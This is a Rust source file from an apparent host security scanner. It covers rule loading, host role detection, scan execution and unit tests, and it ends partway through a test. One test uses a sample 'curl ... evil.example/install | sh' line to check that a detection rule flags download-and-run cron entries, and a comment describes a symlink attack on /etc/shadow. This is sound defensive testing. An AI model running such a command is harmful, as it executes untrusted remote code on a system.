use crate::collectors::Collector;
use crate::condition::Condition;
use crate::models::{
    CollectorError, Finding, FindingStatus, OperatingSystem, Rule, RuleLoadError, ScanRun,
};
use chrono::Utc;
use std::collections::HashMap;
use std::path::Path;
use uuid::Uuid;
use walkdir::WalkDir;

pub struct LoadedRule {
    pub rule: Rule,
    pub condition: Condition,
}

/// Which OS to scan as, and which opt-in "needs" are active — the two axes rules are
/// filtered by (docs/guide/architecture.md's Profiles section). `os` is a hard filter (a
/// macOS-tagged rule never runs on Linux, full stop); `needs` is additive opt-in (a rule
/// tagged `profiles: [server]` only runs when "server" is in `needs`; a rule with no
/// `profiles` tag at all is universal and always runs regardless of `needs`).
#[derive(Debug, Clone)]
pub struct Profile {
    pub os: OperatingSystem,
    pub needs: Vec<String>,
}

impl Profile {
    /// The host's actual OS and its auto-detected role(s).
    ///
    /// `needs` used to be hardcoded empty here, which quietly made `profiles:` a dead feature for
    /// every caller that didn't pass needs by hand — including the desktop app's background
    /// monitor ([`crate::engine::run_scan`] via `Profile::default()`). A rule tagged
    /// `profiles: [server]` simply never ran. That's the worst kind of bug for a security tool:
    /// not a false alarm, a silent *gap*, indistinguishable from a clean result.
    pub fn current_host() -> Self {
        Self {
            os: OperatingSystem::current().unwrap_or(OperatingSystem::Linux),
            needs: detect_host_roles(&RoleEvidence::from_host()),
        }
    }
}

/// The host signals used to decide which role(s) a machine plays. Split from the detection logic
/// so the policy below is testable without a machine that actually has a display manager.
#[derive(Debug, Clone, Default)]
pub struct RoleEvidence {
    /// A display manager or graphical target — the strong, reliable "a human sits at this" signal.
    pub graphical: bool,
    /// sshd is active. A box that accepts SSH is serving, whatever its chassis says.
    pub sshd_active: bool,
    /// DMI chassis reports server/rack-mount, or we're in a VM/container.
    pub server_chassis: bool,
}

impl RoleEvidence {
    fn from_host() -> Self {
        // /run/systemd/units/ is the cheapest active-unit oracle that doesn't shell out to
        // systemctl; the /run/<dm> directories cover non-systemd and pre-login states.
        //
        // Note we must name the *concrete* units, not `display-manager.service` — that name is an
        // alias, and systemd records the invocation under the real unit (`gdm.service` on this
        // machine), so the alias alone silently detects nothing.
        let unit_active = |unit: &str| {
            std::path::Path::new(&format!("/run/systemd/units/invocation:{unit}")).exists()
        };
        let any_unit_active = |units: &[&str]| units.iter().any(|u| unit_active(u));

        let graphical = any_unit_active(&[
            "display-manager.service",
            "gdm.service",
            "gdm3.service",
            "lightdm.service",
            "sddm.service",
            "lxdm.service",
            "xdm.service",
        ]) || ["/run/gdm3", "/run/gdm", "/run/lightdm", "/run/sddm"]
            .iter()
            .any(|p| std::path::Path::new(p).exists())
            || std::fs::read_link("/etc/systemd/system/default.target")
                .map(|t| t.to_string_lossy().contains("graphical"))
                .unwrap_or(false);

        // `.socket` as well as `.service` is load-bearing, not belt-and-braces: Ubuntu now ships
        // SSH socket-activated, so on an idle box that fully accepts SSH there is no running
        // `ssh.service` at all — only `ssh.socket` listening. Checking the service alone would
        // read a live SSH server as "not serving" and skip every server rule on it.
        let sshd_active =
            any_unit_active(&["ssh.service", "sshd.service", "ssh.socket", "sshd.socket"]);

        // DMI chassis type, per SMBIOS 3.x §7.4.1: 17 = "Main Server Chassis", 23 = "Rack Mount
        // Chassis", 28 = "Blade". Absent inside most VMs/containers, which is fine — those fall
        // through to the no-graphical-session branch below and are treated as servers anyway.
        let server_chassis = std::fs::read_to_string("/sys/class/dmi/id/chassis_type")
            .map(|t| matches!(t.trim(), "17" | "23" | "28"))
            .unwrap_or(false);

        Self {
            graphical,
            sshd_active,
            server_chassis,
        }
    }
}

/// Maps host evidence to opted-in needs.
///
/// The asymmetry here is deliberate and is the whole point. Misfiling a server as a desktop
/// silently *skips* its hardening rules — a false clean, the failure mode the architecture doc
/// ranks worst (§8). Misfiling a desktop as a server merely adds noise. So "server" is the
/// default and "desktop" is what has to be affirmatively proven, not the other way round.
///
/// The roles are not exclusive: a laptop running sshd gets both, because the moment you accept
/// SSH the server rules (login banners, remote log shipping) genuinely do apply to you.
pub fn detect_host_roles(ev: &RoleEvidence) -> Vec<String> {
    let mut needs = Vec::new();
    if ev.graphical {
        needs.push("desktop".to_string());
    }
    if ev.sshd_active || ev.server_chassis || !ev.graphical {
        needs.push("server".to_string());
    }
    needs
}

impl Default for Profile {
    fn default() -> Self {
        Self::current_host()
    }
}

fn rule_matches_profile(rule: &Rule, profile: &Profile) -> bool {
    rule.os.contains(&profile.os)
        && (rule.profiles.is_empty() || rule.profiles.iter().any(|p| profile.needs.contains(p)))
}

/// Reads at most `max` bytes of `path` as UTF-8 (lossy), so an oversized rule file can't be used
/// to exhaust memory during a scan. Opens without following a symlink at the final component.
fn read_capped(path: &Path, max: u64) -> std::io::Result<String> {
    use std::io::Read;
    #[cfg(unix)]
    let file = {
        use std::os::unix::fs::OpenOptionsExt;
        std::fs::OpenOptions::new()
            .read(true)
            .custom_flags(libc::O_NOFOLLOW)
            .open(path)?
    };
    #[cfg(not(unix))]
    let file = std::fs::File::open(path)?;
    let mut buf = Vec::new();
    file.take(max).read_to_end(&mut buf)?;
    Ok(String::from_utf8_lossy(&buf).into_owned())
}

/// Loads every `.yaml`/`.yml` file under `dir` as a [`Rule`], parsing its condition too.
/// A rule that fails to parse (bad YAML, unknown fields, or a bad condition expression)
/// is collected as a [`RuleLoadError`] and skipped — never a silent drop and never a panic
/// that takes the rest of the pack down with it (architecture doc §8).
pub fn load_rules(dir: &Path) -> (Vec<LoadedRule>, Vec<RuleLoadError>) {
    let mut loaded = Vec::new();
    let mut errors = Vec::new();

    // WalkDir doesn't recurse *through* symlinks by default, but it still yields a symlink entry,
    // and `read_to_string` on one follows it at the OS level. A rules dir can be attacker-supplied
    // (`--rules-dir`, and it's passed into the root pkexec scan), so a planted `x.yaml -> /etc/shadow`
    // would otherwise be read — as root — and its content reflected back in the parse-error message.
    // Skip symlinks outright, and read each rule through a size cap so a multi-GB `*.yaml` can't OOM
    // the (possibly root) process.
    const MAX_RULE_BYTES: u64 = 1024 * 1024;
    for entry in WalkDir::new(dir)
        .follow_links(false)
        .into_iter()
        .filter_map(Result::ok)
    {
        if entry.path_is_symlink() {
            continue;
        }
        let path = entry.path();
        let ext = path.extension().and_then(|e| e.to_str());
        if !matches!(ext, Some("yaml") | Some("yml")) {
            continue;
        }
        let path_str = path.display().to_string();
        let text = match read_capped(path, MAX_RULE_BYTES) {
            Ok(t) => t,
            Err(e) => {
                errors.push(RuleLoadError {
                    path: path_str,
                    message: e.to_string(),
                });
                continue;
            }
        };
        let rule: Rule = match serde_yaml::from_str(&text) {
            Ok(r) => r,
            Err(e) => {
                errors.push(RuleLoadError {
                    path: path_str,
                    message: e.to_string(),
                });
                continue;
            }
        };
        match Condition::parse(&rule.condition) {
            Ok(condition) => loaded.push(LoadedRule { rule, condition }),
            Err(e) => errors.push(RuleLoadError {
                path: path_str,
                message: format!("rule {}: bad condition: {}", rule.id, e),
            }),
        }
    }

    // Reject duplicate rule IDs. Reconciliation is keyed on `rule_id` (store.rs), and its resolve
    // pass assumes one rule per ID: if two different rules share an ID and one evaluates cleanly
    // while the other's collector was skipped, the clean one's ID enters `rules_evaluated` and the
    // resolve pass wrongly closes the skipped one's carried-forward findings — defeating the
    // "a skipped check is not a passing one" invariant. So a collision is a load error, and the
    // duplicates are dropped rather than left to silently corrupt state.
    let mut seen: std::collections::HashMap<String, usize> = std::collections::HashMap::new();
    for r in &loaded {
        *seen.entry(r.rule.id.clone()).or_insert(0) += 1;
    }
    let dupes: std::collections::HashSet<String> = seen
        .into_iter()
        .filter(|(_, n)| *n > 1)
        .map(|(id, _)| id)
        .collect();
    if !dupes.is_empty() {
        for id in &dupes {
            errors.push(RuleLoadError {
                path: format!("rule id {id}"),
                message: format!(
                    "duplicate rule id '{id}' — ids must be unique (reconciliation keys on them)"
                ),
            });
        }
        loaded.retain(|r| !dupes.contains(&r.rule.id));
    }

    (loaded, errors)
}

/// True when running with an effective UID of 0 — the CLI's `--privileged` flag is only
/// honored under `sudo` (architecture doc §4 ADR-0004: no `pkexec` self-elevation from the CLI).
pub fn is_running_as_root() -> bool {
    unsafe { libc::geteuid() == 0 }
}

/// Runs every applicable collector at most once (memoized by name), evaluates every loaded
/// rule against the fact rows its collector produced, and assembles a [`ScanRun`]. A rule
/// referencing an inapplicable or failed collector contributes no findings for that rule,
/// but the failure itself is still surfaced in `collector_errors` — never silent (§8).
/// `privileged` gates collectors that declare [`Collector::requires_privilege`]; when
/// false, they're skipped and named in `privileged_collectors_skipped` rather than run
/// (and failing with a permission error) or silently omitted. `profile` gates both rules
/// (by `Rule::os`/`Rule::profiles`) and collectors (by `Collector::supported_os`) — a
/// macOS/Windows-only collector's `collect()` is structurally unreachable on Linux, not
/// just conventionally skipped.
pub fn run_scan(
    rules_dir: &Path,
    collectors: &[Box<dyn Collector>],
    privileged: bool,
    profile: &Profile,
) -> ScanRun {
    run_scan_cancellable(rules_dir, collectors, privileged, profile, &|| false)
}

/// [`run_scan`] plus the ability to stop. `should_cancel` is polled between collectors — the
/// coarsest unit that still makes Stop responsive, since an individual collector is a sub-second
/// file read. A cancelled run reports `cancelled: true`, and its `rules_evaluated` covers only
/// the collectors that actually got to run, so nothing downstream can mistake "we stopped before
/// checking this" for "this passed" (see `Store::persist_and_reconcile`). Callers should decline
/// to persist a cancelled run at all.
pub fn run_scan_cancellable(
    rules_dir: &Path,
    collectors: &[Box<dyn Collector>],
    privileged: bool,
    profile: &Profile,
    should_cancel: &dyn Fn() -> bool,
) -> ScanRun {
    let started_at = Utc::now();
    let scan_run_id = Uuid::new_v4();
    let mut cancelled = false;

    let (all_rules, rule_load_errors) = load_rules(rules_dir);
    let rules: Vec<LoadedRule> = all_rules
        .into_iter()
        .filter(|r| rule_matches_profile(&r.rule, profile))
        .collect();

    let mut needed: HashMap<&str, ()> = HashMap::new();
    for r in &rules {
        needed.insert(r.rule.collector.as_str(), ());
    }

    let mut facts_by_collector: HashMap<String, Vec<crate::models::Fact>> = HashMap::new();
    let mut collector_errors = Vec::new();
    let mut privileged_collectors_skipped = Vec::new();

    for collector in collectors {
        if should_cancel() {
            cancelled = true;
            break;
        }
        if !needed.contains_key(collector.name()) {
            continue;
        }
        if !collector.supported_os().contains(&profile.os) {
            continue;
        }
        if !collector.is_applicable() {
            continue;
        }
        if collector.requires_privilege() && !privileged {
            privileged_collectors_skipped.push(collector.name().to_string());
            continue;
        }
        // Isolate each collector behind `catch_unwind`: a collector that *panics* on malformed
        // system input (an unwrap, an out-of-bounds slice) must not take the whole scan — possibly
        // the root pkexec scan — down with it. A panic is recorded as a collector error, exactly
        // like a returned `Err`, keeping the fail-soft contract the rest of the engine relies on.
        let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| collector.collect()));
        match result {
            Ok(Ok(rows)) => {
                facts_by_collector.insert(collector.name().to_string(), rows);
            }
            Ok(Err(e)) => collector_errors.push(CollectorError {
                collector: collector.name().to_string(),
                message: e.to_string(),
            }),
            Err(panic) => {
                let msg = panic
                    .downcast_ref::<&str>()
                    .map(|s| s.to_string())
                    .or_else(|| panic.downcast_ref::<String>().cloned())
                    .unwrap_or_else(|| "collector panicked".to_string());
                collector_errors.push(CollectorError {
                    collector: collector.name().to_string(),
                    message: format!("collector panicked: {msg}"),
                });
            }
        }
    }

    let mut findings = Vec::new();
    // Rules that actually got evaluated against real facts. A rule whose collector was skipped
    // (no privilege), inapplicable, or errored never lands here — so "this rule produced no
    // finding" can be read as "it passed" only for the rules in this list. See
    // `ScanRun::rules_evaluated` and `Store::persist_and_reconcile`.
    let mut rules_evaluated = Vec::new();
    let now = Utc::now();
    for loaded in &rules {
        let Some(rows) = facts_by_collector.get(loaded.rule.collector.as_str()) else {
            continue;
        };
        // Only a rule that evaluates cleanly counts as "evaluated". A condition that *errors*
        // (bad regex, a field of an unexpected type) produces no finding — but that is a failure
        // to check, not a passing check, and treating it as the latter would let a broken rule
        // silently resolve the very findings it can no longer test for. Same invariant as a
        // skipped collector: absence of a finding only means "fixed" when the check actually ran.
        let mut evaluated_cleanly = true;
        for row in rows {
            match loaded.condition.eval(row) {
                Ok(true) => findings.push(Finding {
                    id: Uuid::new_v4(),
                    rule_id: loaded.rule.id.clone(),
                    severity: loaded.rule.severity,
                    // Templated like `explain` (not just a static clone): a list-shaped
                    // collector's rule (module_blacklist, banners, ...) produces one finding
                    // per row, and a title that doesn't distinguish rows reads as duplicated
                    // issues in the UI even though the underlying rows — and the reconciled
                    // storage — are already correctly distinct. Real user report, not a
                    // hypothetical: BLWK-BANN-001's two rows (issue/issue.net) and
                    // BLWK-KERNEL-020's five (one per module) both had this problem.
                    title: render_template(&loaded.rule.title, row),
                    explanation: render_template(&loaded.rule.explain, row),
                    fix_hint: render_template(&loaded.rule.fix, row),
                    context: row.clone(),
                    first_seen: now,
                    last_seen: now,
                    status: FindingStatus::Open,
                    scan_run_id,
                }),
                Ok(false) => {}
                Err(e) => {
                    evaluated_cleanly = false;
                    collector_errors.push(CollectorError {
                        collector: loaded.rule.collector.clone(),
                        message: format!("rule {} condition error: {}", loaded.rule.id, e),
                    });
                }
            }
        }
        if evaluated_cleanly {
            rules_evaluated.push(loaded.rule.id.clone());
        }
    }

    ScanRun {
        id: scan_run_id,
        started_at,
        finished_at: Some(Utc::now()),
        host_fingerprint: host_fingerprint(),
        rules_loaded: rules.len(),
        rule_load_errors,
        collector_errors,
        privileged_collectors_skipped,
        rules_evaluated,
        cancelled,
        findings,
    }
}

/// Minimal `{{ field }}` interpolation into a rule's `explain` template — deliberately not a
/// full template engine, matching the "flat condition DSL, not a new language" philosophy.
/// Shared with the log pipeline (`logs::run_log_scan`), which templates log-rule titles the
/// same way against a decoded event's fields.
pub(crate) fn render_template(template: &str, fact: &crate::models::Fact) -> String {
    let mut out = String::with_capacity(template.len());
    let mut rest = template;
    while let Some(start) = rest.find("{{") {
        out.push_str(&rest[..start]);
        rest = &rest[start + 2..];
        let Some(end) = rest.find("}}") else {
            out.push_str("{{");
            out.push_str(rest);
            return out;
        };
        let field = rest[..end].trim();
        let field = field.split_once('.').map(|(_, r)| r).unwrap_or(field);
        if let Some(v) = fact.get(field) {
            match v {
                serde_json::Value::String(s) => out.push_str(s),
                other => out.push_str(&other.to_string()),
            }
        }
        rest = &rest[end + 2..];
    }
    out.push_str(rest);
    out
}

pub(crate) fn host_fingerprint() -> String {
    let hostname = std::fs::read_to_string("/etc/hostname")
        .unwrap_or_default()
        .trim()
        .to_string();
    let kernel = std::fs::read_to_string("/proc/sys/kernel/osrelease")
        .unwrap_or_default()
        .trim()
        .to_string();
    format!("{hostname}/{kernel}")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    struct FixedCollector {
        rows: Vec<crate::models::Fact>,
    }
    impl Collector for FixedCollector {
        fn name(&self) -> &'static str {
            "sshd_config"
        }
        fn collect(&self) -> anyhow::Result<Vec<crate::models::Fact>> {
            Ok(self.rows.clone())
        }
    }

    fn write_rule(dir: &Path, filename: &str, yaml: &str) {
        let path = dir.join(filename);
        let mut f = std::fs::File::create(path).unwrap();
        f.write_all(yaml.as_bytes()).unwrap();
    }

    #[test]
    fn end_to_end_scan_produces_expected_finding() {
        let tmp = tempfile::tempdir().unwrap();
        write_rule(
            tmp.path(),
            "ssh-password-auth.yaml",
            r#"
id: BLWK-SSH-001
title: SSH password authentication is enabled
category: ssh-remote-access
severity: critical
collector: sshd_config
condition: password_authentication == "yes"
explain: "PasswordAuthentication is '{{ sshd.password_authentication }}'"
fix: "Set PasswordAuthentication no"
references: [CIS-5.2.10]
"#,
        );

        let mut fact = crate::models::Fact::new();
        fact.insert(
            "password_authentication".to_string(),
            serde_json::Value::String("yes".to_string()),
        );
        let collectors: Vec<Box<dyn Collector>> =
            vec![Box::new(FixedCollector { rows: vec![fact] })];

        let scan = run_scan(tmp.path(), &collectors, false, &Profile::default());
        assert_eq!(scan.rules_loaded, 1);
        assert!(scan.rule_load_errors.is_empty());
        assert_eq!(scan.findings.len(), 1);
        assert_eq!(scan.findings[0].rule_id, "BLWK-SSH-001");
        assert_eq!(
            scan.findings[0].explanation,
            "PasswordAuthentication is 'yes'"
        );
    }

    /// Drives the *real shipped* BLWK-ROOTKIT-001 against the two interfaces that matter, because
    /// the bug this guards against shipped: every `docker run` attaches a veth to a bridge, the
    /// kernel sets IFF_PROMISC on it (that is what a bridge port *is*), and the rule cried
    /// rootkit on a healthy container host. Reading the rule from `rules/` rather than an inline
    /// copy is the point — an edit to the condition that reintroduces the false positive fails
    /// here.
    #[test]
    fn rootkit_001_ignores_bridge_ports_but_still_catches_a_promiscuous_nic() {
        let iface = |name: &str, promiscuous: bool, bridge_port: bool| {
            let mut fact = crate::models::Fact::new();
            fact.insert("interface".into(), serde_json::Value::String(name.into()));
            fact.insert("promiscuous".into(), serde_json::Value::Bool(promiscuous));
            fact.insert("bridge_port".into(), serde_json::Value::Bool(bridge_port));
            fact
        };

        // `FixedCollector` answers to "sshd_config"; this rule binds to "network_interfaces".
        struct NetIfaceCollector {
            rows: Vec<crate::models::Fact>,
        }
        impl Collector for NetIfaceCollector {
            fn name(&self) -> &'static str {
                "network_interfaces"
            }
            fn collect(&self) -> anyhow::Result<Vec<crate::models::Fact>> {
                Ok(self.rows.clone())
            }
        }

        let rules_dir =
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/rootkit-malware");
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(NetIfaceCollector {
            rows: vec![
                // Docker's veth: promiscuous, but only because the bridge enslaved it.
                iface("veth6dc1556", true, true),
                // A real NIC someone put a sniffer on. Still a genuine rootkit signal.
                iface("wlp9s0", true, false),
                // An ordinary quiet NIC.
                iface("enx6c1ff7c0d2d9", false, false),
            ],
        })];

        let scan = run_scan(&rules_dir, &collectors, false, &Profile::default());
        let found: Vec<_> = scan
            .findings
            .iter()
            .filter(|f| f.rule_id == "BLWK-ROOTKIT-001")
            .collect();

        assert_eq!(
            found.len(),
            1,
            "exactly one interface here is a real sniffer signal, got: {:?}",
            found.iter().map(|f| &f.title).collect::<Vec<_>>()
        );
        assert!(
            found[0].explanation.contains("wlp9s0"),
            "must flag the NIC, not the container veth: {}",
            found[0].explanation
        );
        // The `fix` line is the one that tells a user what command to run. It used to reach the
        // UI as the literal string `{{ network_interfaces.interface }}`, because `fix` was the
        // only field cloned instead of rendered.
        assert!(
            found[0].fix_hint.contains("ip -d link show wlp9s0"),
            "fix must be templated, not raw: {}",
            found[0].fix_hint
        );
    }

    #[test]
    fn host_role_detection_fails_toward_scanning_more_not_less() {
        let ev = |graphical, sshd_active, server_chassis| RoleEvidence {
            graphical,
            sshd_active,
            server_chassis,
        };

        // A headless box is a server even with no other evidence — the absence of a display
        // manager is enough, because guessing "desktop" here would silently skip its rules.
        assert_eq!(detect_host_roles(&ev(false, false, false)), ["server"]);
        assert_eq!(detect_host_roles(&ev(false, true, false)), ["server"]);
        assert_eq!(detect_host_roles(&ev(false, false, true)), ["server"]);

        // A GNOME laptop with sshd off: desktop only. This is the case that should NOT be told to
        // blacklist usb-storage or ship its logs to a syslog host it doesn't have.
        assert_eq!(detect_host_roles(&ev(true, false, false)), ["desktop"]);

        // ...but the moment that same laptop accepts SSH, the server rules genuinely apply to it,
        // so it gets both rather than being forced into one bucket.
        assert_eq!(
            detect_host_roles(&ev(true, true, false)),
            ["desktop", "server"]
        );

        // A workstation in a rack-mount chassis: both, same reasoning.
        assert_eq!(
            detect_host_roles(&ev(true, false, true)),
            ["desktop", "server"]
        );

        // Nothing may ever produce an empty needs list — that would resurrect the original bug,
        // where every `profiles:`-tagged rule silently vanished from the scan.
        for g in [true, false] {
            for s in [true, false] {
                for c in [true, false] {
                    assert!(
                        !detect_host_roles(&ev(g, s, c)).is_empty(),
                        "no evidence combination may yield zero roles ({g},{s},{c})"
                    );
                }
            }
        }
    }

    struct PrivilegedFixedCollector {
        rows: Vec<crate::models::Fact>,
    }
    impl Collector for PrivilegedFixedCollector {
        fn name(&self) -> &'static str {
            "sudoers"
        }
        fn requires_privilege(&self) -> bool {
            true
        }
        fn collect(&self) -> anyhow::Result<Vec<crate::models::Fact>> {
            Ok(self.rows.clone())
        }
    }

    #[test]
    fn privileged_collector_is_skipped_and_reported_when_unprivileged() {
        let tmp = tempfile::tempdir().unwrap();
        write_rule(
            tmp.path(),
            "sudo-nopasswd.yaml",
            r#"
id: BLWK-PRIV-001
title: NOPASSWD sudo entry
category: privilege-escalation
severity: high
collector: sudoers
condition: nopasswd == true
explain: "e"
fix: "f"
"#,
        );
        let mut fact = crate::models::Fact::new();
        fact.insert("nopasswd".to_string(), serde_json::Value::Bool(true));
        let collectors: Vec<Box<dyn Collector>> =
            vec![Box::new(PrivilegedFixedCollector { rows: vec![fact] })];

        let unprivileged = run_scan(tmp.path(), &collectors, false, &Profile::default());
        assert_eq!(unprivileged.privileged_collectors_skipped, vec!["sudoers"]);
        assert!(
            unprivileged.findings.is_empty(),
            "a skipped collector must not silently pass as clean"
        );

        let privileged = run_scan(tmp.path(), &collectors, true, &Profile::default());
        assert!(privileged.privileged_collectors_skipped.is_empty());
        assert_eq!(privileged.findings.len(), 1);
    }

    /// Stopping a scan must not be mistaken for a scan that ran and passed. A cancelled run
    /// reports `cancelled`, and — critically — leaves the collectors it never reached out of
    /// `rules_evaluated`, so `Store::persist_and_reconcile` can't resolve their findings as
    /// "fixed". Without that, pressing Stop would silently mark unchecked issues as clean.
    #[test]
    fn a_cancelled_scan_evaluates_nothing_and_reports_itself() {
        let tmp = tempfile::tempdir().unwrap();
        write_rule(
            tmp.path(),
            "ssh.yaml",
            r#"
id: BLWK-SSH-001
title: t
category: c
severity: high
collector: sshd_config
condition: password_authentication == "yes"
explain: "e"
fix: "f"
"#,
        );
        let mut fact = crate::models::Fact::new();
        fact.insert(
            "password_authentication".to_string(),
            serde_json::Value::String("yes".to_string()),
        );
        let collectors: Vec<Box<dyn Collector>> =
            vec![Box::new(FixedCollector { rows: vec![fact] })];

        // Cancelled before the first collector runs.
        let scan =
            run_scan_cancellable(tmp.path(), &collectors, false, &Profile::default(), &|| {
                true
            });
        assert!(scan.cancelled);
        assert!(scan.findings.is_empty());
        assert!(
            scan.rules_evaluated.is_empty(),
            "a rule whose collector never ran must not count as evaluated — otherwise Stop would \
             resolve its open findings as fixed"
        );

        // The same scan, allowed to finish, does find the issue.
        let full = run_scan(tmp.path(), &collectors, false, &Profile::default());
        assert!(!full.cancelled);
        assert_eq!(full.findings.len(), 1);
        assert_eq!(full.rules_evaluated, vec!["BLWK-SSH-001"]);
    }

    /// A rule whose condition *errors* has not passed — it has failed to run. If it were counted
    /// as evaluated, `Store::persist_and_reconcile` would resolve its open findings as "fixed"
    /// simply because the broken rule produced none, which is the same "absence means passing"
    /// mistake a skipped collector would make.
    #[test]
    fn a_rule_whose_condition_errors_does_not_count_as_evaluated() {
        let tmp = tempfile::tempdir().unwrap();
        write_rule(
            tmp.path(),
            "numeric-on-a-string.yaml",
            r#"
id: BLWK-BROKEN-001
title: t
category: c
severity: high
collector: sshd_config
condition: password_authentication > 5
explain: "e"
fix: "f"
"#,
        );
        // The field is a string, so a numeric comparison against it errors at eval time.
        let mut fact = crate::models::Fact::new();
        fact.insert(
            "password_authentication".to_string(),
            serde_json::Value::String("yes".to_string()),
        );
        let collectors: Vec<Box<dyn Collector>> =
            vec![Box::new(FixedCollector { rows: vec![fact] })];

        let scan = run_scan(tmp.path(), &collectors, false, &Profile::default());

        assert!(scan.findings.is_empty());
        assert_eq!(
            scan.collector_errors.len(),
            1,
            "the eval failure must be reported"
        );
        assert!(
            !scan
                .rules_evaluated
                .contains(&"BLWK-BROKEN-001".to_string()),
            "a rule that errored must not be treated as having run clean — otherwise it would \
             resolve the very findings it can no longer check for"
        );
    }

    #[test]
    fn invalid_rule_is_reported_not_silently_dropped() {
        let tmp = tempfile::tempdir().unwrap();
        write_rule(tmp.path(), "broken.yaml", "not: [valid, rule, schema");
        let (rules, errors) = load_rules(tmp.path());
        assert!(rules.is_empty());
        assert_eq!(errors.len(), 1);
    }

    /// Regression test for a real gap caught while raising this crate's test coverage: a
    /// rule's `collector:` field is only checked against the YAML schema, never against the
    /// actual registered collectors — a typo there loads without error and then simply
    /// never matches a fact row at scan time, silently never firing. `bulwarkctl`'s `rules
    /// validate` now cross-checks this too, but the bundled pack's own correctness belongs
    /// in bulwark-core's own test suite, not only in a CLI-level check.
    #[test]
    fn every_bundled_rule_references_a_real_collector() {
        let rules_dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules");
        let (rules, errors) = load_rules(&rules_dir);
        assert!(
            errors.is_empty(),
            "bundled rule pack failed to load: {errors:?}"
        );

        let known: std::collections::HashSet<&str> = crate::collectors::all_collectors()
            .iter()
            .map(|c| c.name())
            .collect::<Vec<_>>()
            .into_iter()
            .collect();
        for loaded in &rules {
            assert!(
                known.contains(loaded.rule.collector.as_str()),
                "{} references unknown collector '{}'",
                loaded.rule.id,
                loaded.rule.collector
            );
        }
    }

    /// Regression test for a real bug caught by dogfooding this rule pack against a live
    /// machine: BLWK-ACCT-001's regex had a backslash-escaping mismatch that made `.*sh`
    /// match almost anything ending in "sh", flagging every legitimate `*.sh` cron script
    /// as a critical finding. Loads the actual bundled rule pack, not a fixture copy, so a
    /// future edit to the real YAML is what this test protects.
    #[test]
    fn bundled_ruleset_does_not_false_positive_on_ordinary_shell_scripts() {
        let rules_dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules");
        let (rules, errors) = load_rules(&rules_dir);
        assert!(
            errors.is_empty(),
            "bundled rule pack failed to load: {errors:?}"
        );

        let acct_001 = rules
            .iter()
            .find(|r| r.rule.id == "BLWK-ACCT-001")
            .expect("BLWK-ACCT-001 should be in the bundled pack");

        let mut benign = crate::models::Fact::new();
        benign.insert(
            "command".to_string(),
            serde_json::Value::String(
                "cd /home/user/proj && bash scripts/daily_job_scraper.sh >> log 2>&1".to_string(),
            ),
        );
        assert!(
            !acct_001.condition.eval(&benign).unwrap(),
            "an ordinary .sh cron script must not be flagged"
        );

        let mut malicious = crate::models::Fact::new();
        malicious.insert(
            "command".to_string(),
            serde_json::Value::String("curl -s https://evil.example/install | sh".to_string()),
        );
        assert!(
            acct_001.condition.eval(&malicious).unwrap(),
            "a real curl-pipe-to-sh pattern must still be flagged"
        );
    }

    /// Regression coverage for the Lynis-derived SSH-004..011 rule pack: loads the real
    /// bundled rules and evaluates them against `parse_sshd_config` output (not a hand-built
    /// fact map) for both a deliberately weakened and a hardened sshd_config, so a future
    /// edit to either the YAML or the sshd_config parser breaks this test instead of shipping
    /// silently. Each of the 8 new rules must fire on the weak config and stay quiet on the
    /// hardened one — a rule that's always-on or always-off would pass a "does it load"
    /// check but be useless in practice.
    #[test]
    fn ssh_hardening_rules_fire_on_weak_config_and_stay_quiet_on_hardened_config() {
        let rules_dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules");
        let (rules, errors) = load_rules(&rules_dir);
        assert!(
            errors.is_empty(),
            "bundled rule pack failed to load: {errors:?}"
        );

        let weak_text = "X11Forwarding yes\n\
             AllowTcpForwarding yes\n\
             PermitUserEnvironment yes\n\
             PermitTunnel yes\n\
             StrictModes no\n\
             GatewayPorts yes\n\
             AllowAgentForwarding yes\n\
             MaxAuthTries 999\n";
        let weak_fact = crate::collectors::sshd::parse_sshd_config(weak_text);

        let hardened_text = "X11Forwarding no\n\
             AllowTcpForwarding no\n\
             PermitUserEnvironment no\n\
             PermitTunnel no\n\
             StrictModes yes\n\
             GatewayPorts no\n\
             AllowAgentForwarding no\n\
             MaxAuthTries 3\n";
        let hardened_fact = crate::collectors::sshd::parse_sshd_config(hardened_text);

        for rule_id in [
            "BLWK-SSH-004",
            "BLWK-SSH-005",
            "BLWK-SSH-006",
            "BLWK-SSH-007",
            "BLWK-SSH-008",
            "BLWK-SSH-009",
            "BLWK-SSH-010",
            "BLWK-SSH-011",
        ] {
            let loaded = rules
                .iter()
                .find(|r| r.rule.id == rule_id)
                .unwrap_or_else(|| panic!("{rule_id} should be in the bundled pack"));
            assert!(
                loaded.condition.eval(&weak_fact).unwrap(),
                "{rule_id} should fire on a deliberately weakened sshd_config"
            );
            assert!(
                !loaded.condition.eval(&hardened_fact).unwrap(),
                "{rule_id} should stay quiet on a hardened sshd_config"
            );
        }
    }

    #[test]
    fn is_running_as_root_matches_the_real_euid() {
        // Test runners are essentially never root — exercises the function against the
        // real geteuid() rather than a fixture, which is the only honest way to test a
        // one-line FFI wrapper like this.
        assert_eq!(is_running_as_root(), unsafe { libc::geteuid() == 0 });
    }

    struct FailingCollector;
    impl Collector for FailingCollector {
        fn name(&self) -> &'static str {
            "sshd_config"
        }
        fn collect(&self) -> anyhow::Result<Vec<crate::models::Fact>> {
            anyhow::bail!("permission denied reading config")
        }
    }

    #[test]
    fn a_collector_that_errors_is_reported_not_silently_skipped() {
        let tmp = tempfile::tempdir().unwrap();
        write_rule(
            tmp.path(),
            "ssh-password-auth.yaml",
            r#"
id: BLWK-SSH-001
title: t
category: c
severity: low
collector: sshd_config
condition: password_authentication == "yes"
explain: "e"
fix: "f"
"#,
        );
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(FailingCollector)];
        let scan = run_scan(tmp.path(), &collectors, false, &Profile::default());
        assert!(scan.findings.is_empty());
        assert_eq!(scan.collector_errors.len(), 1);
        assert_eq!(scan.collector_errors[0].collector, "sshd_config");
        assert!(scan.collector_errors[0]
            .message
            .contains("permission denied"));
    }

    /// A rule file that's listed by the directory walk but fails to *read* (permission
    /// revoked between listing and open, a race any real filesystem can hit) must be
    /// reported the same way a malformed-YAML file is — never silently dropped.
    #[test]
